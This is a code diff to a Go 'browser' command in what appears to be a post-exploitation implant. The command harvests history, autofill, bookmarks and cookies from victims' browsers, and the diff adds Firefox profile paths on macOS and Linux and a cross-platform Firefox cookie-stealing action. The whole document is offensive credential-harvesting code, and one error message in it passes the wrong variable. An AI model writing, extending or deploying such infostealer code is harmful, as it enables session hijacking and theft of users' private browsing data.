@@ -22,7 +22,7 @@ type BrowserCommand struct{}
 
 func (c *BrowserCommand) Name() string { return "browser" }
 func (c *BrowserCommand) Description() string {
-	return "Harvest history, autofill, and bookmarks from Chromium-based browsers"
+	return "Harvest history, autofill, and bookmarks from Chromium-based browsers and Firefox"
 }
 
 func (c *BrowserCommand) Execute(task structs.Task) structs.CommandResult {
@@ -49,10 +49,15 @@ func (c *BrowserCommand) Execute(task structs.Task) structs.CommandResult {
 		return browserAutofill(args)
 	case "bookmarks":
 		return browserBookmarks(args)
-	case "passwords", "cookies":
-		return errorf("Action '%s' requires DPAPI decryption and is only supported on Windows. Use 'history', 'autofill', or 'bookmarks' on %s.", args.Action, runtime.GOOS)
+	case "cookies":
+		if strings.EqualFold(args.Browser, "firefox") {
+			return browserFirefoxCookies(args)
+		}
+		return errorf("Action 'cookies' requires DPAPI decryption for Chromium browsers and is only supported on Windows. Use -browser firefox for Firefox cookies on %s.", runtime.GOOS)
+	case "passwords":
+		return errorf("Action 'passwords' requires DPAPI/Keychain decryption and is only supported on Windows. Use 'history', 'autofill', 'bookmarks', or 'cookies -browser firefox' on %s.", args.Action)
 	default:
-		return errorf("Unknown action: %s. Use: history, autofill, bookmarks (passwords/cookies are Windows-only)", args.Action)
+		return errorf("Unknown action: %s. Use: history, autofill, bookmarks, cookies (Firefox cookies on all platforms; Chromium cookies Windows-only)", args.Action)
 	}
 }
 
@@ -71,12 +76,14 @@ func browserPaths(browser string) map[string]string {
 			"Chrome":   filepath.Join(home, "Library", "Application Support", "Google", "Chrome"),
 			"Chromium": filepath.Join(home, "Library", "Application Support", "Chromium"),
 			"Edge":     filepath.Join(home, "Library", "Application Support", "Microsoft Edge"),
+			"Firefox":  filepath.Join(home, "Library", "Application Support", "Firefox", "Profiles"),
 		}
 	case "linux":
 		all = map[string]string{
 			"Chrome":   filepath.Join(home, ".config", "google-chrome"),
 			"Chromium": filepath.Join(home, ".config", "chromium"),
 			"Edge":     filepath.Join(home, ".config", "microsoft-edge"),
+			"Firefox":  filepath.Join(home, ".mozilla", "firefox"),
 		}
 	default:
 		return nil
@@ -96,6 +103,8 @@ func browserPaths(browser string) map[string]string {
 		return map[string]string{"Edge": all["Edge"]}
 	case "chromium":
 		return map[string]string{"Chromium": all["Chromium"]}
+	case "firefox":
+		return map[string]string{"Firefox": all["Firefox"]}
 	default:
 		return all
 	}
